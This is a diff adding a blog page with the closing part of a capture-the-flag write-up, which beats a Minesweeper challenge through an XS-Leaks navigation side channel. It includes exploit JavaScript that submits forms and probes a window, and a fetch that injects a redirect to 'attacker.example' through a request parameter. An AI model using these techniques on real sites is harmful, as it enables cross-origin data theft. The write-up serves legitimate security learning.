+</span><span>  </span><span style="color:#c594c5;">let </span><span>w </span><span style="color:#5fb3b3;">= </span><span style="color:#fac863;">window</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">open</span><span style="color:#5fb3b3;">(&#39;&#39;, &#39;</span><span style="color:#99c794;">redirect-window</span><span style="color:#5fb3b3;">&#39;);
+</span><span>
+</span><span>  </span><span style="color:#c594c5;">const </span><span>leak </span><span style="color:#5fb3b3;">= </span><span style="color:#c594c5;">async </span><span style="color:#5fb3b3;">() </span><span style="color:#c594c5;">=&gt; </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#fac863;">document</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">getElementById</span><span style="color:#5fb3b3;">(&#39;</span><span style="color:#99c794;">form-callback</span><span style="color:#5fb3b3;">&#39;).</span><span style="color:#6699cc;">submit</span><span style="color:#5fb3b3;">();
+</span><span>    </span><span style="color:#c594c5;">await </span><span style="color:#6699cc;">sleep</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">2500</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#6699cc;">callback</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#c594c5;">await </span><span style="color:#6699cc;">sleep</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">100</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#6699cc;">callback</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#c594c5;">await </span><span style="color:#6699cc;">sleep</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">100</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#6699cc;">callback</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#c594c5;">await </span><span style="color:#6699cc;">sleep</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">100</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#6699cc;">callback</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#c594c5;">await </span><span style="color:#6699cc;">sleep</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">100</span><span style="color:#5fb3b3;">);
+</span><span>    </span><span style="color:#6699cc;">callback</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">);
+</span><span>  </span><span style="color:#5fb3b3;">};
+</span><span>
+</span><span>  </span><span style="color:#fac863;">window</span><span style="color:#5fb3b3;">.</span><span style="color:#fac863;">opener</span><span style="color:#5fb3b3;">.</span><span>onunload </span><span style="color:#5fb3b3;">= () </span><span style="color:#c594c5;">=&gt; </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#fac863;">document</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">getElementById</span><span style="color:#5fb3b3;">(&#39;</span><span style="color:#99c794;">form-guess</span><span style="color:#5fb3b3;">&#39;).</span><span style="color:#6699cc;">submit</span><span style="color:#5fb3b3;">()
+</span><span style="color:#6699cc;">    leak</span><span style="color:#5fb3b3;">();
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span></code></pre>
+</details>
+<p>This application allows us to redirect the bot to <code>https://attacker.example/entry/&lt;tile&gt;</code>,
+triggering the XSLeaks exploit, which will (eventually) print out “safe” or “bomb”.</p>
+<p>Finally, since sending these requests manually would be tiring, we can declare a
+JavaScript function in our browser’s console that simply takes the index of the tile
+we want to reveal and sends the appropriate request:</p>
+<pre data-lang="js" style="background-color:#2b2c2f;color:#cccece;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#c594c5;">const </span><span style="color:#6699cc;">oracle </span><span style="color:#5fb3b3;">= (</span><span style="color:#f99157;">tile</span><span style="color:#5fb3b3;">) </span><span style="color:#c594c5;">=&gt; </span><span style="color:#6699cc;">fetch</span><span>(</span><span style="color:#5fb3b3;">`</span><span style="color:#99c794;">/checkboard</span><span style="color:#5fb3b3;">`, {
+</span><span>  method</span><span style="color:#5fb3b3;">: &#39;</span><span style="color:#99c794;">POST</span><span style="color:#5fb3b3;">&#39;,
+</span><span>  body</span><span style="color:#5fb3b3;">: new </span><span>URLSearchParams(</span><span style="color:#5fb3b3;">{
+</span><span>    cloneid</span><span style="color:#5fb3b3;">: `</span><span style="color:#99c794;">something&amp;redirect=//attacker.example/entry/</span><span style="color:#5fb3b3;">${</span><span>tile</span><span style="color:#5fb3b3;">}`,
+</span><span>  </span><span style="color:#5fb3b3;">}</span><span>)</span><span style="color:#5fb3b3;">,
+</span><span style="color:#5fb3b3;">}</span><span>)</span><span style="color:#5fb3b3;">;
+</span></code></pre>
+<p>Running <code>oracle(0)</code> should, within about 10 seconds, tell us whether the tile
+on the top-left corner is a bomb, printing this information to to the terminal
+running our Node.js application.</p>
+<h3 id="play-strategies">Play Strategies</h3>
+<p>As you might recall, in order to get the flag we need to get 20 perfect games,
+which would be easy to do using the oracle in combination with some automated
+solver.
+However, I was too lazy to implement one, so I ended up playing the 20 games by
+hand, which took way too long, but was definitely faster than trying to
+implement a solver for it.
+Here are some strategies that I adopted:</p>
+<ul>
+<li>First, I made a drawing of the board with the tile numbers, which made it
+easier to use the oracle on the correct tile without having to count each time;</li>
+<li>Second, it is possible to restart the board whenever we want, by calling the
+<code>/newboard</code> GET endpoint, without it incurring a loss, which is useful for when
+there is a 50/50 and we are out of oracles (recall that we have 5 per game);</li>
+<li>Third, I always start with the top-left corner and restart the board if it is
+a bomb, maximising the number of available oracles throughout the game;</li>
+<li>Fourth, it is important to keep in mind the aforementioned peculiarities
+of the board generation function, which help on certain 50/50 situations.</li>
+</ul>
+<p>Using these strategies, it is quite easy to get the 20 wins, even if it takes
+a while.
+Below is a sample gameplay:</p>
+<figure><img src=".&#x2F;using-oracle.gif" alt="Sample gameplay animation using the oracle for tiles 0, 6, 42, 45 and 40" loading="lazy" decoding="async" /><figcaption>Sample gameplay animation using the oracle for tiles 0, 6, 42, 45 and 40</figcaption></figure>
+<p>After repeating the process 20 times, we get the flag on the home page:</p>
+<figure><a href=".&#x2F;flag-view.png" class="img-fullscreen-link" target="_blank">
+    <img
+      src=".&#x2F;flag-view.png"
+      srcset="https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.6c6a29a836bb568f.webp 1900w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.31cd8fa30c228ba5.webp 1800w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.3c6cb2562a9492b1.webp 1700w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.d18dfd5964379130.webp 1600w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.39dc99ef7395251a.webp 1500w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.c1a7483d11301f00.webp 1400w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.9aea54e48564cc55.webp 1300w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.3abc6c5ffde7e3bf.webp 1200w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.7908471054d8c7bd.webp 1100w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.9bd6dbe0a1bcaca2.webp 1000w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.c076cd5f3c267bff.webp 900w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.de4212c9f616666f.webp 800w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.adfea041b3351ddb.webp 700w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.a85a8a4c2e939235.webp 600w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.422ade8cfff8f62b.webp 500w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.975881525903479c.webp 400w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.b7b004a97b160e31.webp 300w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.773d3d693bf98e8c.webp 200w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.627fe3295e85e3a9.webp 100w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;flag-view.b0341b3a41338c5c.webp 1920w"
+      alt="The homepage showing the flag after winning 20 out of 20 games"
+      width="1920"
+      loading="lazy"
+      decoding="async"
+    />
+  </a><figcaption>The homepage showing the flag after winning 20 out of 20 games</figcaption></figure>
+<h2 id="final-remarks">Final Remarks</h2>
+<p>Solving this challenge makes us take a deep dive into navigation-related
+side channels on the web, inferring information that would otherwise
+not be possible to extract.
+Even with all the sandboxing built into the browser, it is still not
+enough to properly isolate different origins from each other.</p>
+<p>While I hit many road blocks while trying to solve this challenge, it ended
+up being very fun, and I definitely have deepened my knowledge in XSLeaks.</p>
+
+    </div>
+  </article>
+  <div><a href="https://parnianlali.github.io/blog/atom.xml" style="display: inline-block; width: 2rem;" target="_blank">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20 5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"/></svg>
+        </a></div>
+  <div class="disclaimer">
+    This post has been written by humans only, unless otherwise explicitly stated.<br>
+    Opinions are solely my own and do not reflect those of any employer, past, present, or future.<br>
+    Content licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">CC BY-NC-SA 4.0</a>.
+  </div>
+</div>
+
+
+    </main>
+    <footer>
+      <div class="container footer-sections">
+        <div class="footer-section">
+          <h2>Contact me</h2>
+          <ul>
+            
+              <li>
+                <span class="social-label">Email: </span>
+                <a
+                  href="mailto:parnian.lalii@gmail.com"
+                  target="_blank"
+                  rel="me noopener"
+                  data-umami-event="mail-social-footer"
+                >
+                  parnian.lalii@gmail.com
+                </a>
+              </li>
+            
+              <li>
+                <span class="social-label">Linkedin: </span>
+                <a
+                  href="www.linkedin.com&#x2F;in&#x2F;parnianlali"
+                  target="_blank"
+                  rel="me noopener"
+                  data-umami-event="Linkedin-social-footer"
+                >
+                  parnian lali
+                </a>
+              </li>
+            
+              <li>
+                <span class="social-label">github: </span>
+                <a
+                  href="https:&#x2F;&#x2F;github.com&#x2F;parnianlali"
+                  target="_blank"
+                  rel="me noopener"
+                  data-umami-event="github-social-footer"
+                >
+                  parnianlali
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+        <div class="footer-section">
+          <h2>Site map</h2>
+          <ul>
+            <li><a href="https:&#x2F;&#x2F;parnianlali.github.io">Home</a></li>
+            <li><a href="https:&#x2F;&#x2F;github.com&#x2F;parnianlali&#x2F;CV">CV</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="copyright">
+        <div class="container">
+          <p class="copyright-text">&copy; 2025 Parnian Lali. Based on a template by <a href="https://github.com/diogotcorreia">Diogo Correia</a>.
+          </p>
+          
+        </div>
+      </div>
+    </footer>
+
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    // 
+    const navbar = document.querySelector("nav");
+    const observer = new IntersectionObserver(entries => {
+      if (entries[0].boundingClientRect.y < 0) {
+        navbar.classList.add("navbar--sticky");
+      } else {
+        navbar.classList.remove("navbar--sticky");
+      }
+    });
+    observer.observe(document.querySelector("#navbar-trigger"));
+
+    const drawer = document.getElementById("navbar-drawer");
+    const drawerOpenBtn = document.getElementById("drawer-open");
+    const drawerCloseBtn = document.getElementById("drawer-close");
+
+    drawerOpenBtn.addEventListener("click", () => {
+      drawer.showModal();
+    });
+    document.querySelectorAll("#drawer-close, #navbar-drawer a").forEach(element => {
+      element.addEventListener("click", () => {
+        drawer.close();
+      });
+    });
+  });
+</script>
+    <script
+      async
+      defer
+      data-website-id="25c8aedf-a960-4b55-8c70-7bc4b2ad587b"
+      src="https://umami.diogotc.com/hellothere.js"
+      data-domains="diogotc.com,www.diogotc.com"
+    ></script>
+
+  </body>
+</html>
